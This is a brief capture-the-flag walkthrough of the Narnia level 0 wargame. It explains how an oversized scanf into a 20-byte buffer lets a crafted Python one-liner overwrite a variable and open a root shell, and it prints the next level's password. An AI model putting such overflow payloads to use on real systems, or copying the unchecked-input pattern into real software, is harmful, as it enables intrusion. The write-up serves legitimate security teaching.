# narnia0
slopey112 - 3/5/19

Let's first take a look at our binary and see what it does.
```
narnia0@narnia:/narnia$ ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: asdfasdf
buf: asdfasdf
val: 0x41414141
WAY OFF!!!!
```
It seems that if we are able to change the value of `val` to `0xdeadbeef`, we are able to get the flag. This at first seems like an impossible challenge, until we open up the source code.
```c
#include <stdio.h>
#include <stdlib.h>

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}
```
The value that we supply is passed to the address of `buf`. However, it seems like there's ia critical error: `scanf` is asking for 24 bytes, but the size of `buf` is only 20. Without opening GDB we can already find the answer to this problem.

Our payload should overwrite the 20 bytes in `buf` and then everything else is passed to `val`. Since we are given a shell, the only other complication is that we need to pass `cat` in our payload as well.
```
narnia0@narnia:/narnia$ (python -c "print 'A'*20+'\xef\xbe\xad\xde'"; cat) |./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
cd /etc/narnia_pass
cat narnia1
efeidiedae
```
